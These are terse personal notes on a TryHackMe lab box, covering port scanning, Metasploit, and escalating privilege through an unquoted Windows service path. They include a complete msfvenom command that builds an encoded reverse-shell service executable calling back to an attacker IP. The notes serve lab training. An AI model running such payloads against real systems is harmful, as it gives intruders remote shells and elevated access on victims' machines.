tryhack me 

recon 
nmap workd rustscan did not
port 80 8080 open
port 8080 had a vulnerability 
msfconsole 
powershell mafia ps script
use unquoted strings to get service we can exploit 
turn off service using sc net stop service
crate a payload with msf venom add advanced.exe 
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.249.117 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe


to its path
run 